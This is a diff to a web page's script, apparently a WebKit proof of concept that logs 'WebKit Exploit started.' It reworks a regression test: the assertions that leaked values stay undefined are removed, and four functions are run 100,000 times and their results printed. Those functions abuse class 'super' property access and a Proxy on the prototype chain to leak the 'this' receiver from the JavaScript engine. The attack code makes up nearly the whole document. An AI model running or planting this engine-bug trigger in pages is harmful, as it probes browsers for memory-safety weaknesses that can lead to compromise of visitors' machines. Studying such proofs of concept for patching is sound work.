@@ -46,118 +46,116 @@ document.addEventListener('DOMContentLoaded', function () {
 
     log("WebKit Exploit started.");
 
-    function assert(x) {
-        if (!x) {
-            const error = "Bad assertion!";
-            log(error);
-            throw new Error(error);
+    function tryToLeakThisViaGetById() {
+        class Leaker {
+            leak() {
+                return super.foo;
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            get(target, propertyName, receiver) {
+                return receiver;
+            }
+        });
+
+        const foo = 42;
+        const {leak} = Leaker.prototype;
+
+        return (() => leak())();
+    }
+
+    function tryToLeakThisViaGetByVal() {
+        class Leaker {
+            leak() {
+                return super[Math.random() < 0.5 ? "foo" : "bar"];
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            get(target, propertyName, receiver) {
+                return receiver;
+            }
+        });
+
+        const foo = 42;
+        const bar = 84;
+        const {leak} = Leaker.prototype;
+
+        return (() => leak())();
+    }
+
+    function tryToLeakThisViaSetById() {
+        let receiver;
+        class Leaker {
+            leak() {
+                super.foo = {};
+                return receiver;
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            set(target, propertyName, value, __receiver) {
+                receiver = __receiver;
+                return true;
+            }
+        });
+
+        const foo = 42;
+        const {leak} = Leaker.prototype;
+
+        return (() => leak())();
+    }
+
+    function tryToLeakThisViaSetByVal() {
+        let receiver;
+        class Leaker {
+            leak() {
+                super[Math.random() < 0.5 ? "foo" : "bar"] = {};
+                return receiver;
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            set(target, propertyName, value, __receiver) {
+                receiver = __receiver;
+                return true;
+            }
+        });
+
+        const foo = 42;
+        const bar = 84;
+        const {leak} = Leaker.prototype;
+
+        return (() => leak())();
+    }
+
+    for (var i = 0; i < 1e5; i++) {
+        try {
+            log(`Iteration ${i}: Starting attempt`);
+
+            const result1 = tryToLeakThisViaGetById();
+            log(`tryToLeakThisViaGetById: ${result1}`);
+
+            const result2 = tryToLeakThisViaGetByVal();
+            log(`tryToLeakThisViaGetByVal: ${result2}`);
+
+            const result3 = tryToLeakThisViaSetById();
+            log(`tryToLeakThisViaSetById: ${result3}`);
+
+            const result4 = tryToLeakThisViaSetByVal();
+            log(`tryToLeakThisViaSetByVal: ${result4}`);
+
+            if (i % 100 === 0) {
+                log(`Iteration ${i} completed successfully.`);
+            }
+        } catch (error) {
+            log(`Error encountered at iteration ${i}: ${error.message}`);
+            break; // Exit loop on failure
         }
     }
 
-    (function() {
-        function tryToLeakThisViaGetById() {
-            class Leaker {
-                leak() {
-                    return super.foo;
-                }
-            }
-
-            Leaker.prototype.__proto__ = new Proxy({}, {
-                get(target, propertyName, receiver) {
-                    return receiver;
-                }
-            });
-
-            const foo = 42;
-            const {leak} = Leaker.prototype;
-
-            return (() => leak())();
-        }
-
-        function tryToLeakThisViaGetByVal() {
-            class Leaker {
-                leak() {
-                    return super[Math.random() < 0.5 ? "foo" : "bar"];
-                }
-            }
-
-            Leaker.prototype.__proto__ = new Proxy({}, {
-                get(target, propertyName, receiver) {
-                    return receiver;
-                }
-            });
-
-            const foo = 42;
-            const bar = 84;
-            const {leak} = Leaker.prototype;
-
-            return (() => leak())();
-        }
-
-        function tryToLeakThisViaSetById() {
-            let receiver;
-            class Leaker {
-                leak() {
-                    super.foo = {};
-                    return receiver;
-                }
-            }
-
-            Leaker.prototype.__proto__ = new Proxy({}, {
-                set(target, propertyName, value, __receiver) {
-                    receiver = __receiver;
-                    return true;
-                }
-            });
-
-            const foo = 42;
-            const {leak} = Leaker.prototype;
-
-            return (() => leak())();
-        }
-
-        function tryToLeakThisViaSetByVal() {
-            let receiver;
-            class Leaker {
-                leak() {
-                    super[Math.random() < 0.5 ? "foo" : "bar"] = {};
-                    return receiver;
-                }
-            }
-
-            Leaker.prototype.__proto__ = new Proxy({}, {
-                set(target, propertyName, value, __receiver) {
-                    receiver = __receiver;
-                    return true;
-                }
-            });
-
-            const foo = 42;
-            const bar = 84;
-            const {leak} = Leaker.prototype;
-
-            return (() => leak())();
-        }
-
-        for (var i = 0; i < 1e5; i++) {
-            try {
-                log(`Iteration ${i}: Starting attempt`);
-                assert(tryToLeakThisViaGetById() === undefined);
-                assert(tryToLeakThisViaGetByVal() === undefined);
-                assert(tryToLeakThisViaSetById() === undefined);
-                assert(tryToLeakThisViaSetByVal() === undefined);
-
-                if (i % 100 === 0) {
-                    log(`Iteration ${i} completed successfully.`);
-                }
-            } catch (error) {
-                log(`Error encountered at iteration ${i}: ${error.message}`);
-                break; // Exit loop on failure
-            }
-        }
-
-        log("All leak attempts completed.");
-    })();
+    log("All leak attempts completed.");
 });
 </script>
 
